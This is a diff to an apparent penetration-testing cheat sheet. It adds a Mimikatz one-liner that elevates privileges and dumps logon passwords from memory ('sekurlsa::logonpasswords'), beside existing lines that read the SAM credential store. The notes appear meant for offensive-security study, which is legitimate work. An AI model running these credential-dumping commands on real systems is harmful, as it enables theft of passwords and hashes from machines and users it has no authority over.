@@ -202,6 +202,8 @@ tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
 ### Mimikatz
 
 ```
+./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" “exit”
+# One-liner
 privilege::debug
 token::elevate
 lsadump::sam
